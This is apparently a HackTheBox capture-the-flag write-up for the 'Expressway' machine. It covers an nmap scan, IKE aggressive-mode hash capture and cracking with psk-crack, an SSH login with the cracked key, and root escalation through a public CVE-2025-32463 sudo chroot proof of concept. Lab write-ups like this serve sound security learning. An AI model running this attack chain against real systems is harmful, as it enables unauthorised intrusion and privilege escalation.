# Expressway-HTB Writeup

In this writeup I will document how I solved the easy maching Expressway on [HackTheBox](https://hackthebox.com)

## Enumeration
First we're provided with IP 10.10.11.87 so we do an nmap scan



```bash
~/Expressway$ nmap -sS -sU 10.10.11.87

Nmap scan report for expressway.htb (10.10.11.87)
Host is up (0.061s latency).
Not shown: 999 closed tcp ports (reset), 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
22/tcp   open          ssh
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

We see a non-filtered **ssh** and **isakmp** ports, so these are what we're going to try to exploit.

So lets use ike-scan tool.

See [500/udp - Pentesting IPsec/IKE VPN](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html) for more info

```bash
~/Expressway$ ike-scan -A -M -P 10.10.11.87

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=7777d5f9ebb81440)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
87537dad265c5fdada986cfbf6af3e49a6ef0b958e603637061e8d5302e9b32bb57633d69fbf535f9b2173c4d8b7403ae19df5fbee0ff55b078abe95eaf0d388b272cb866b1651ecab7f786367b16d1d45b6e5465318418622cded8c82dde92dff3b2f1422c5499ad3f28305eca4ecd0251aa0333b73198e19f5c8d5d1bc9249:6b1e23c2978110f1218bf6f3c8ca287a0c700856865aa3f965c733af3cb2e2b28e734c61701294f5abe51215afcba49b8d0655ea8ae4c6ef6265a1ae17dce3bc393c989e4d0d655adb229e71e1069870c9b762d9acd31e2ad35c364ef5e52ef549bd995572f2101d226f67bfbdb9c7d46432c0857f4a875b3d1e29affcd7bccd:b2b150339b97fd3f:122466ccf2558fd1:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:1f1162cf8b684d3f8dbaae84c7a14f4a0b7c1ef9:780aebf37fff61c147180d1c753289e75bf1c47b7f79f286114585aa41b5c662:eb17ec137cf0cbba9f251b09bef4c0c26fb63158

Ending ike-scan 1.9.6: 1 hosts scanned in 0.084 seconds (11.85 hosts/sec).  1 returned handshake; 0 returned notify
```
And we get an ID ```ike@expressway.htb```  as well as a PSK hash, which we save to the hash.txt file
We can extract the secretkey from hash.txt

**Make sure to edit your /etc/hosts file to add Expressway IP to DNS**


![expressway dns](https://github.com/AmnesiacDev/Expressway-HTB-Writeup/blob/main/expressway_to_DNS.png)


Now, let's try to figure out the secret key from our hash

```bash
~/Expressway$ psk-crack -d /use/share/wordlist/rockyou.txt hash.txt

Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash fce99fae1f49cc2a827452beb06eda208e9f0f4c
Ending psk-crack: 8045040 iterations in 5.468 seconds (1471410.52 iterations/sec)

```


Our password is ***freakingrockstarontheroad***

## Exploit

Now lets connect using ssh port

```bash
~/Expressway$ ssh ike@expressway.htb
ike@expressway.htb password: 

#We are in
ike@expressway:~$ id 
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)

ike@expressway:~$ ls
user.txt

ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```
Just like that we have our first flag under user.txt

After some quick searching on sudo version 1.9.17 exploits I found this  [CVE-2025-32463 – sudo chroot](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) 

On your machine
```bash
#Clone the chwoot repo
~/Expressway$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git

#Seeing what's inside
~/Expressway/cd CVE-2025-32463_chwoot$ ls
Dockerfile  LICENSE  README.md  run.sh  sudo-chwoot.sh

#Sending the sudo_chwoot.sh file to ike@expressway.htb
~/Expressway/cd CVE-2025-32463_chwoot$ scp sudo_chwoot.sh ike@expressway.htb:/home/ike 

#Now we just run the poc
ike@expressway:~$ ./sudo-chwoot.sh 
root@expressway:/# whoami
root

root@expressway:/# ls root
root.txt
```

Just like that we found our root flag 


